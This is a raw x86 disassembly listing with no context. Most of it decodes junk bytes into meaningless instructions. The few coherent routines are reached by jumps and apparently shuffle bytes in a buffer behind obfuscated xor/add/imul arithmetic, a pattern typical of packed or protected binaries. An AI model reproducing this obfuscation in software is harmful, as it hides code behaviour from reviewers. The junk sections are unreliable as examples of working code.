  4084af:	mov    WORD PTR [eax+0x770dc300],?
  4084b5:	jmp    0x18e53fb1
  4084ba:	rcr    DWORD PTR [edx],1
  4084bc:	mov    ds:0xa1e84308,al
  4084c1:	xchg   ebx,eax
  4084c2:	iret   
  4084c3:	fldenv [ecx+0x68]
  4084c6:	(bad)  
  4084c8:	pop    eax
  4084c9:	cmp    BYTE PTR [eax+0x33a3da0b],cl
  4084cf:	ret    0xc9b0
  4084d2:	xor    ah,al
  4084d4:	arpl   WORD PTR [edi-0x68],bp
  4084d7:	mov    ds:0x81f3c316,eax
  4084dc:	jns    0x4084a6
  4084de:	call   0x8bf4:0xbc08b7de
  4084e5:	and    DWORD PTR [eax-0xf308a],0x9d206f16
  4084ef:	pop    ss
  4084f0:	push   0xffffffa8
  4084f2:	fs and al,0xc3
  4084f5:	sub    cl,BYTE PTR [ebp+edx*1+0x60]
  4084f9:	dec    ebp
  4084fa:	and    DWORD PTR [edx+0x7b],edi
  4084fd:	sahf   
  4084fe:	sbb    al,0xc4
  408501:	push   ecx
  408502:	pop    eax
  408503:	fnstenv [ebx+0xd]
  408506:	jge    0x408499
  408508:	or     eax,0x81b8c8aa
  40850d:	out    0x37,al
  40850f:	test   al,0x5d
  408511:	push   ss
  408512:	mov    ch,0x63
  408514:	mov    ebx,0x942c9e06
  408519:	adc    DWORD PTR [edi],eax
  40851b:	call   0xa5768a65
  408520:	mov    edi,0xb02ac6a
  408525:	test   BYTE PTR [edi+0x24345cbd],0x55
  40852c:	in     al,dx
  40852d:	sbb    BYTE PTR [ecx],al
  40852f:	pop    edx
  408530:	inc    edi
  408531:	mov    ds:0x98ce4844,al
  408536:	call   0x4e37a623
  40853b:	int    0x3d
  40853d:	sub    al,BYTE PTR [ecx+ebp*2]
  408540:	and    BYTE PTR [esi-0x6448cce7],ch
  408546:	jp     0x408556
  408548:	xlat   BYTE PTR ds:[ebx]
  408549:	sub    eax,0x1df581ff
  40854e:	push   ebx
  40854f:	sbb    al,0xe6
  408551:	dec    ebp
  408552:	loope  0x4084f9
  408554:	fnsave [ecx+0x240b4bd1]
  40855a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40855b:	lds    eax,FWORD PTR [ebp-0x1966a465]
  408561:	push   ecx
  408562:	xchg   esi,eax
  408563:	scas   al,BYTE PTR es:[edi]
  408564:	mov    esp,0xf51591fd
  408569:	repnz out dx,al
  40856b:	(bad)  
  40856c:	stos   DWORD PTR es:[edi],eax
  40856d:	test   BYTE PTR [edx-0x2dc6b162],dh
  408573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408574:	loope  0x408588
  408576:	mov    ds:0xb0397a3c,eax
  40857b:	mov    al,ds:0x564dc394
  408580:	and    BYTE PTR [eax],dh
  408582:	retf   0xa22d
  408585:	xchg   ebp,eax
  408586:	das    
  408587:	jne    0x4085c4
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x8826353f
  4085c4:	xchg   edi,eax
  4085c5:	fndisi(8087 only) 
  4085c7:	xlat   BYTE PTR ds:[ebx]
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x40861b
  4085cf:	lods   al,BYTE PTR ds:[esi]
  4085d0:	in     eax,dx
  4085d1:	repz (bad)
  4085d4:	mov    ch,0xf2
  4085d6:	or     al,0xe4
  4085d8:	cmp    al,0x3c
  4085da:	out    dx,al
  4085db:	fisubr WORD PTR [eax]
  4085dd:	cmp    eax,0x1a9c7119
  4085e2:	je     0x40860a
  4085e4:	scas   al,BYTE PTR es:[edi]
  4085e5:	stc    
  4085e6:	mov    bh,0xdd
  4085e8:	sbb    edx,edi
  4085ea:	push   edx
  4085eb:	outs   dx,BYTE PTR ds:[esi]
  4085ec:	or     al,BYTE PTR [edx-0xcb2c861]
  4085f2:	push   esi
  4085f3:	xor    edi,ecx
  4085f5:	fs or  eax,0x249d3213
  4085fb:	loope  0x4085e6
  4085fd:	inc    BYTE PTR [bx+si]
  408600:	add    al,0xc8
  408602:	ds stc 
  408604:	cdq    
  408605:	rol    bh,cl
  408607:	jns    0x40861e
  408609:	loope  0x40858e
  40860b:	ss leave 
  40860d:	out    dx,eax
  40860e:	inc    ebp
  40860f:	adc    DWORD PTR ds:0xd987ca10,0x87ca54a1
  408619:	call   0x3666:0x242f4473
  408620:	adc    ax,WORD PTR [ecx+eiz*8+0x294d6add]
  408628:	jg     0x4085be
  40862a:	std    
  40862b:	pop    ecx
  40862c:	mov    edx,DWORD PTR [edi+edi*8+0x38]
  408630:	jae    0x408664
  408632:	(bad)  
  408633:	icebp  
  408634:	test   al,0x9b
  408636:	fldcw  WORD PTR [ebx-0x15]
  408639:	mov    dl,0xda
  40863b:	ret    
  40863c:	retf   
  40863d:	aad    0xbc
  40863f:	(bad)  
  408640:	out    dx,eax
  408641:	push   esp
  408642:	cld    
  408643:	and    eax,0x300b2157
  408648:	in     eax,0xa
  40864a:	gs int3 
  40864c:	mov    edi,0x13f5a059
  408651:	jmp    DWORD PTR [ecx-0x342e952b]
  408657:	imul   eax,DWORD PTR [eax],0x97aa010c
  40865d:	dec    ebx
  40865e:	in     eax,0x93
  408660:	out    dx,al
  408661:	ds sub eax,0x71aeb1d4
  408667:	int    0x8e
  408669:	shr    BYTE PTR [edi+ebp*8-0x1d],0xe5
  40866e:	(bad)  
  40866f:	or     edx,esp
  408671:	adc    al,0x2f
  408673:	dec    ecx
  408674:	(bad)  
  408675:	xchg   edi,eax
  408676:	mov    ah,0x36
  408678:	sub    al,0xbc
  40867a:	xor    edi,DWORD PTR [edx+0x5e22218a]
  408680:	(bad)  
  408682:	(bad)  
  408683:	jmp    0x408695
  408685:	repnz mov al,0xfc
  408688:	fbld   TBYTE PTR [edi+0x69]
  40868b:	mov    bl,0x2a
  40868d:	xchg   edx,eax
  40868e:	inc    esi
  40868f:	and    ch,BYTE PTR [ecx-0x38]
  408692:	xchg   BYTE PTR [esp+ecx*1+0x72913e4f],al
  408699:	cli    
  40869a:	and    ebx,DWORD PTR [esp+ebx*1-0x47f84495]
  4086a1:	add    al,0xec
  4086a3:	test   al,0xb
  4086a5:	stc    
  4086a6:	jb     0x408651
  4086a8:	and    al,BYTE PTR gs:[ecx]
  4086ab:	cmp    DWORD PTR [edi+0x15],ebx
  4086ae:	(bad)  
  4086af:	jnp    0x408676
  4086b1:	fldcw  WORD PTR [esi+ecx*2]
  4086b4:	mov    eax,0xb92e839f
  4086b9:	jbe    0x408662
  4086bb:	daa    
  4086bc:	ss fcmovnbe st,st(3)
  4086bf:	mov    edi,DWORD PTR [esi+0x7f7cbb6c]
  4086c5:	es test eax,0x1db39b7a
  4086cb:	(bad)  
  4086cc:	mov    ebp,0x347c5a09
  4086d1:	pop    eax
  4086d2:	shl    dh,0xbf
  4086d5:	into   
  4086d6:	arpl   WORD PTR ds:0x1102ad44,cx
  4086dc:	jmp    0x95599140
  4086e1:	cmc    
  4086e2:	sbb    DWORD PTR [eax+0x1541e501],edx
  4086e8:	jg     0x408728
  4086ea:	or     cl,BYTE PTR [edx]
  4086ec:	jnp    0x408760
  4086ee:	pop    esi
  4086ef:	adc    eax,esi
  4086f1:	lea    ebp,[edx]
  4086f3:	push   ds
  4086f4:	fsubr  st(7),st
  4086f6:	fidiv  DWORD PTR [ebx-0x3962ae3]
  4086fc:	dec    edx
  4086fd:	mov    cl,BYTE PTR [edx+edx*8+0xa]
  408701:	adc    esi,DWORD PTR [ebx-0x462deea6]
  408707:	rcr    DWORD PTR [ebx+0x6b],cl
  40870a:	sahf   
  40870b:	mov    esp,edi
  40870d:	mov    al,ds:0xdb71ba45
  408712:	dec    ebp
  408713:	jns    0x4086da
  408715:	adc    DWORD PTR [eax],esp
  408717:	inc    eax
  408718:	cld    
  408719:	icebp  
  40871a:	cwde   
  40871b:	cmp    al,0x64
  40871d:	cmp    eax,0x4e2ce98d
  408722:	call   0x456a:0xf28aa072
  408729:	jb     0x408768
  40872b:	mov    ah,0x1f
  40872d:	fs aad 0xd
  408730:	jmp    0x4086dd
  408732:	inc    esp
  408733:	test   BYTE PTR [ecx],dl
  408735:	add    esi,DWORD PTR [ecx]
  408737:	pop    esp
  408738:	and    esi,edx
  40873a:	mov    ebp,0xd713f87c
  40873f:	out    0x65,al
  408741:	pop    ebp
  408742:	int3   
  408743:	out    dx,al
  408744:	or     DWORD PTR [ebp+0x6e],edx
  408747:	fadd   QWORD PTR [edx+edi*8-0x77]
  40874b:	enter  0x3633,0xe3
  40874f:	sub    al,0xa5
  408751:	mov    al,BYTE PTR [edx-0x70]
  408754:	xor    eax,0x42037d37
  408759:	mov    BYTE PTR [ebx],cl
  40875b:	cmp    edx,esp
  40875d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40875e:	je     0x408702
  408760:	out    dx,al
  408761:	retf   
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	push   0x6c
  408849:	push   ds
  40884a:	sbb    DWORD PTR [ebp-0x2b],edi
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x40886d
  408854:	mov    ebx,DWORD PTR [edx]
  408856:	das    
  408857:	scas   eax,DWORD PTR es:[edi]
  408858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408859:	xlat   BYTE PTR ds:[ebx]
  40885a:	xor    eax,0x4fa0dc48
  40885f:	adc    DWORD PTR [edi+0x144a2984],ebx
  408865:	dec    eax
  408866:	jo     0xdfbd646b
  40886c:	sbb    al,0x98
  40886e:	add    al,BYTE PTR [esi+ecx*2+0x79c51f7b]
  408875:	dec    esp
  408876:	adc    ecx,DWORD PTR [edx]
  408878:	cmp    DWORD PTR [ebx],ebp
  40887a:	adc    cl,BYTE PTR [eax-0x41]
  40887d:	repz dec ecx
  40887f:	je     0x4088b3
  408881:	iret   
  408882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408883:	sub    eax,0x459604ae
  408888:	pop    ss
  408889:	popf   
  40888a:	add    BYTE PTR [eax],dl
  40888c:	xchg   ecx,eax
  40888d:	xor    eax,0x4ed7175e
  408892:	mov    bl,BYTE PTR [esp+eiz*8-0x28]
  408896:	jmp    0x297ab310
  40889b:	mov    esi,0x31a4f3f7
  4088a0:	in     al,dx
  4088a1:	scas   eax,DWORD PTR es:[edi]
  4088a2:	mov    ah,0x2
  4088a4:	fneni(8087 only) 
  4088a6:	mov    WORD PTR [eax],?
  4088a8:	xor    al,ch
  4088aa:	push   ss
  4088ab:	(bad)  
  4088ad:	jg     0x40885b
  4088af:	imul   edx,DWORD PTR [esi],0x2a687670
  4088b5:	adc    BYTE PTR [eax],dl
  4088b7:	cmp    BYTE PTR [ecx+0x3e283206],dh
  4088bd:	xchg   edx,eax
  4088be:	aad    0x48
  4088c0:	push   ebp
  4088c1:	aaa    
  4088c2:	sbb    DWORD PTR [edi+0x78a7fe01],edi
  4088c8:	dec    ecx
  4088c9:	rcl    ecx,0xca
  4088cc:	fs push ss
  4088ce:	jmp    0x88d0:0xc66fa229
  4088d5:	aaa    
  4088d6:	aam    0x67
  4088d8:	enter  0x9203,0xc9
  4088dc:	cli    
  4088dd:	xor    eax,0xbffa65f9
  4088e2:	nop
  4088e3:	ss add eax,0x5a46dbd1
  4088e9:	sub    ebx,DWORD PTR [edx-0x12b7f1b0]
  4088ef:	in     al,dx
  4088f0:	cld    
  4088f1:	repnz das 
  4088f3:	add    bh,BYTE PTR [ebx]
  4088f5:	push   ss
  4088f6:	jns    0x4088a4
  4088f8:	cmp    eax,0x83e29328
  4088fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088fe:	xor    al,0x8b
  408900:	rcr    BYTE PTR [edx+edi*4+0x10c668ec],1
  408907:	jp     0x408945
  408909:	mov    al,ds:0xba24dd1d
  40890e:	daa    
  40890f:	xor    esp,DWORD PTR [ecx+0x3a]
  408912:	jnp    0x4088c2
  408914:	repz pop ebx
  408916:	push   esi
  408917:	cmp    DWORD PTR [esi+0x50],eax
  40891a:	pop    esi
  40891b:	inc    esp
  40891c:	sub    al,0xff
  40891e:	jne    0x4088a2
  408920:	xchg   edx,eax
  408921:	push   esi
  408922:	mov    dh,0xa4
  408924:	or     ebp,DWORD PTR [edi*4+0x7a77ce0a]
  40892b:	sub    al,0x88
  40892d:	fisub  WORD PTR [ecx]
  40892f:	xchg   ebp,eax
  408930:	cld    
  408931:	xor    al,0x94
  408933:	aaa    
  408934:	adc    DWORD PTR [eax],ebp
  408936:	mov    esi,0x9494481a
  40893b:	out    dx,al
  40893c:	push   ss
  40893d:	fs (bad) 
  408940:	arpl   WORD PTR [ebx],bx
  408942:	loope  0x4089bf
  408944:	jge    0x408954
  408946:	inc    esp
  408947:	(bad)  
  408948:	imul   ecx,DWORD PTR [edi+ebx*1],0x659c1074
  40894f:	mov    ah,bh
  408951:	push   edi
  408952:	in     al,0x57
  408954:	cmp    DWORD PTR [edi+eiz*4],edi
  408957:	pop    esi
  408958:	fwait
  408959:	in     al,0x7b
  40895b:	outs   dx,BYTE PTR ds:[esi]
  40895c:	mov    DWORD PTR [ecx],esi
  40895e:	ja     0x4089aa
  408960:	jle    0x4088e3
  408962:	cmc    
  408963:	xchg   esi,eax
  408964:	js     0x4088f1
  408966:	or     eax,eax
  408968:	lahf   
  408969:	add    DWORD PTR [ebx+0x16],edi
  40896c:	(bad)  
  40896d:	imul   esp
  40896f:	daa    
  408970:	cld    
  408971:	(bad)  
  408972:	mov    ah,0xf9
  408974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408975:	and    ch,ch
  408977:	dec    edi
  408978:	xor    dh,BYTE PTR [eax+0x6216bf1]
  40897e:	fist   WORD PTR [ebx]
  408980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408981:	out    0x74,eax
  408983:	cli    
  408984:	loope  0x4089a8
  408986:	mov    ah,0x28
  408988:	sub    ebx,ebx
  40898a:	push   0x34
  40898c:	jo     0x4089f9
  40898e:	aad    0x11
  408990:	sbb    esp,DWORD PTR [eax+0x3c2d7c52]
  408996:	shr    dh,1
  408998:	jo     0x40893b
  40899a:	cmp    cl,BYTE PTR [esi-0x58a82c5c]
  4089a0:	cmp    DWORD PTR [eax],eax
  4089a2:	cdq    
  4089a3:	popf   
  4089a4:	in     eax,0x1e
  4089a6:	shl    bl,1
  4089a8:	pop    edi
  4089a9:	push   ebx
  4089aa:	int3   
  4089ab:	and    DWORD PTR [eax+0x4a0d4d8],ebp
  4089b1:	sub    DWORD PTR [ecx+0x1c2a93df],ebp
  4089b7:	repnz mov esi,0x45492115
  4089bd:	mov    ds:0x20edc48,al
  4089c2:	push   ebp
  4089c3:	and    al,0x7f
  4089c5:	mov    ch,0xe4
  4089c7:	addr16 push edi
  4089c9:	sahf   
  4089ca:	retf   0x83cd
  4089cd:	icebp  
  4089ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089cf:	and    ebp,esi
  4089d1:	cmp    al,0xb2
  4089d3:	(bad)  
  4089d4:	stc    
  4089d5:	jl     0x408a51
  4089d7:	and    eax,0x110bdf9c
  4089dc:	sub    ebp,DWORD PTR [ebx+0x6ffc8328]
  4089e2:	mov    esi,0x46f4695
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	add    eax,0x893082a2
  408a0b:	sar    BYTE PTR [esi+0x7e],cl
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x408a61
  408a13:	stc    
  408a14:	clc    
  408a15:	int    0x8c
  408a17:	gs mov esi,0x7d74ac0f
  408a1d:	shr    DWORD PTR [ecx],cl
  408a1f:	clc    
  408a20:	es fwait
  408a22:	test   eax,0xd7997d24
  408a27:	mov    ch,BYTE PTR [ebx+0x1d6a7ad9]
  408a2d:	pop    ebp
  408a2e:	fstp   DWORD PTR [ebx+0x44]
  408a31:	addr16 adc bh,dl
  408a34:	out    0x84,al
  408a36:	mov    WORD PTR ds:0x40049064,es
  408a3c:	test   DWORD PTR [edi-0x59],edx
  408a3f:	fistp  QWORD PTR [ebx+0x39]
  408a42:	or     ebx,esp
  408a44:	ret    0x1c56
  408a47:	sub    eax,0xb2e7cb4c
  408a4c:	add    al,0x30
  408a4e:	out    0x5b,al
  408a50:	(bad)  
  408a51:	fldenv [eax+edx*8]
  408a54:	js     0x408a03
  408a56:	xchg   ebx,eax
  408a57:	cmp    eax,0x8d71565b
  408a5c:	inc    esi
  408a5d:	mov    ecx,0xc987dfbc
  408a62:	or     al,0x85
  408a64:	mov    ds:0x9c0e6c3f,al
  408a69:	or     esp,DWORD PTR [edi+0x77]
  408a6c:	sbb    edx,DWORD PTR [eax+edx*4-0x4d9368e0]
  408a73:	dec    edx
  408a74:	fwait
  408a75:	dec    edx
  408a76:	int    0x34
  408a78:	fimul  DWORD PTR [ecx]
  408a7a:	(bad)  
  408a7b:	inc    ebp
  408a7c:	stos   DWORD PTR es:[edi],eax
  408a7d:	jns    0x408ad3
  408a7f:	and    cl,BYTE PTR [ecx+0x46]
  408a82:	push   edi
  408a83:	out    dx,al
  408a84:	xchg   edi,eax
  408a85:	mov    dh,0xe9
  408a87:	xor    esp,0xffffff9f
  408a8a:	and    al,0x2c
  408a8c:	idiv   BYTE PTR [ebx-0x6b6b3e91]
  408a92:	call   0x2a9d:0xcb370098
  408a99:	pusha  
  408a9a:	mov    eax,0xd2a664e1
  408a9f:	or     eax,0xaa61a16f
  408aa4:	pushf  
  408aa5:	fild   QWORD PTR [edx]
  408aa7:	(bad)  
  408aa8:	mov    bh,0xd7
  408aaa:	xchg   ebx,eax
  408aab:	dec    edi
  408aac:	mov    dh,ah
  408aae:	add    edi,DWORD PTR [edx+0x4e]
  408ab1:	ja     0x408b14
  408ab3:	(bad)  
  408ab4:	arpl   WORD PTR [ebx],ax
  408ab6:	loop   0x408b13
  408ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ab9:	sub    BYTE PTR [eax+0x11],cl
  408abc:	fs ss xchg edi,eax
  408abf:	test   eax,0xcc7fb26d
  408ac4:	dec    esp
  408ac5:	rcr    esi,1
  408ac7:	pop    eax
  408ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ac9:	(bad)  
  408acb:	xchg   esp,eax
  408acc:	push   eax
  408acd:	sbb    edx,DWORD PTR [eax-0x2ad67cca]
  408ad3:	sti    
  408ad4:	jge    0x408b52
  408ad6:	jo     0x408b56
  408ad8:	jl     0x408ad7
  408ada:	and    ebp,DWORD PTR [edi+0x5feef1de]
  408ae0:	stos   DWORD PTR es:[edi],eax
  408ae1:	ins    BYTE PTR es:[edi],dx
  408ae2:	stos   DWORD PTR es:[edi],eax
  408ae3:	pop    ecx
  408ae4:	sar    DWORD PTR [eax],1
  408ae6:	cmp    al,0xd
  408ae8:	jnp    0x408afa
  408aea:	ja     0x408b55
  408aec:	inc    esp
  408aed:	aad    0x2f
  408aef:	je     0x408aa6
  408af1:	jne    0x408b22
  408af3:	stc    
  408af4:	push   esi
  408af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af6:	loop   0x408ad2
  408af8:	inc    edi
  408af9:	in     al,0xeb
  408afb:	dec    ebx
  408afc:	xchg   BYTE PTR [edx],bl
  408afe:	mov    cl,0x68
  408b00:	cmc    
  408b01:	xlat   BYTE PTR ds:[ebx]
  408b02:	add    DWORD PTR [ebx+0x5d],ebp
  408b05:	mov    bl,0x3e
  408b07:	mov    ds:0x85cd2f,al
  408b0c:	mov    dh,0x92
  408b0e:	stc    
  408b0f:	push   ecx
  408b10:	jp     0x408b01
  408b12:	pop    esp
  408b13:	mov    eax,ds:0x2535b577
  408b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b19:	or     eax,ebx
  408b1b:	mov    bh,bl
  408b1d:	lods   al,BYTE PTR ds:[esi]
  408b1e:	call   FWORD PTR [eax]
  408b20:	xor    eax,0xd8dc8e88
  408b25:	ficomp WORD PTR [eax]
  408b27:	(bad)  
  408b28:	mov    cl,0x3f
  408b2a:	xlat   BYTE PTR ds:[ebx]
  408b2b:	and    BYTE PTR [eax],ah
  408b2d:	imul   ecx,DWORD PTR [edx-0x23b9494c],0x18
  408b34:	out    0x9f,eax
  408b36:	xchg   esi,eax
  408b37:	cmc    
  408b38:	xchg   edx,eax
  408b39:	test   eax,0x239cffaf
  408b3e:	sub    eax,0x82ab602f
  408b43:	pusha  
  408b44:	ficomp WORD PTR [ecx+0xcf60522]
  408b4a:	(bad)  
  408b4b:	push   ebx
  408b4c:	cld    
  408b4d:	sar    al,1
  408b4f:	(bad)  
  408b50:	mov    dh,0x86
  408b52:	xchg   ecx,eax
  408b53:	xchg   ebp,eax
  408b54:	test   BYTE PTR [eax+0x7c423e4a],ah
  408b5a:	push   edi
  408b5b:	add    DWORD PTR [edx],edx
  408b5d:	pushf  
  408b5e:	xor    al,0x36
  408b60:	inc    ebp
  408b61:	add    eax,0xf86fce3f
  408b66:	xchg   BYTE PTR [ebx+edi*4-0x6],al
  408b6a:	and    ebx,edx
  408b6c:	dec    ebp
  408b6d:	out    dx,eax
  408b6e:	imul   edx,DWORD PTR ds:0x1134e6ab,0xffffffc3
  408b75:	adc    BYTE PTR [ebx],0xba
  408b78:	adc    BYTE PTR [ebx+0x5d],0x84
  408b7c:	bnd jnp 0x408b79
  408b7f:	pop    esp
  408b80:	sahf   
  408b81:	sar    DWORD PTR [edx+edx*2-0x34],cl
  408b85:	mov    bl,0x6e
  408b87:	xchg   ebx,eax
  408b88:	or     BYTE PTR cs:[ecx+ebx*4-0x3e],0xef
  408b8e:	or     eax,0x237e968e
  408b93:	loop   0x408b35
  408b95:	stos   DWORD PTR es:[edi],eax
  408b96:	pusha  
  408b97:	mov    ecx,0x7d0a9091
  408b9c:	hlt    
  408b9d:	mov    eax,ss
  408b9f:	aam    0x57
  408ba1:	mov    dh,0x93
  408ba3:	mov    bh,0x36
  408ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	je     0x408baa
  408bda:	addr16 dec edx
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408c34
  408be5:	mov    eax,0xb9d34ac6
  408bea:	or     dl,BYTE PTR [edx]
  408bec:	neg    BYTE PTR [ebp+ebp*8+0x5d283ac6]
  408bf3:	repnz mov ds:0x17b25a09,al
  408bf9:	pop    edx
  408bfa:	dec    ecx
  408bfb:	jo     0x408c16
  408bfd:	mov    edi,esp
  408bff:	sub    DWORD PTR ds:0x353f2fe2,ebp
  408c05:	jecxz  0x408c31
  408c07:	lea    esi,[edi+0x317fbf4c]
  408c0d:	mov    ss,eax
  408c0f:	add    eax,ecx
  408c11:	mov    eax,ds:0x46819b1a
  408c16:	retf   0x873e
  408c19:	sti    
  408c1a:	pop    ebx
  408c1b:	or     BYTE PTR [esi],0xa8
  408c1e:	dec    ebx
  408c1f:	or     dh,dh
  408c21:	test   BYTE PTR fs:[edi+0x5e],0x16
  408c26:	ficomp DWORD PTR [ecx+0x240b937b]
  408c2c:	mov    fs,ecx
  408c2e:	lds    ebx,FWORD PTR [ecx-0x3b]
  408c31:	iret   
  408c32:	scas   al,BYTE PTR es:[edi]
  408c33:	aad    0xa9
  408c35:	xchg   BYTE PTR [edx+ebp*1],bl
  408c38:	je     0x408c67
  408c3a:	clc    
  408c3b:	add    al,0xb8
  408c3d:	mov    ebx,DWORD PTR [ecx+0x10d59333]
  408c43:	lea    edx,[eax]
  408c45:	jge    0x408c6b
  408c47:	int    0xa8
  408c49:	repnz push esi
  408c4b:	scas   eax,DWORD PTR es:[edi]
  408c4c:	pop    eax
  408c4d:	cmp    al,0x68
  408c4f:	and    dl,BYTE PTR [ebx+0x52f5defa]
  408c55:	xchg   BYTE PTR [eax],dh
  408c57:	popa   
  408c58:	cli    
  408c59:	dec    eax
  408c5a:	jle    0x408c7a
  408c5c:	int    0xd9
  408c5e:	pop    edx
  408c5f:	push   0x84f8d4ee
  408c64:	cmc    
  408c65:	jg     0x408cd1
  408c67:	mov    esi,0x2f0a16d7
  408c6c:	repz mov bl,0x37
  408c6f:	inc    edx
  408c70:	or     BYTE PTR ds:0xe24e1775,bh
  408c76:	call   0xeaa1:0x1cea3682
  408c7d:	xor    DWORD PTR [ebx-0x1b],ecx
  408c80:	xchg   ebx,eax
  408c81:	and    eax,0xb5274cbb
  408c86:	push   esi
  408c87:	pop    ds
  408c88:	mov    dl,ch
  408c8a:	pop    edi
  408c8b:	out    0xc,eax
  408c8d:	mov    ds:0x518d24cb,eax
  408c92:	mov    ds:0x6daee5b2,eax
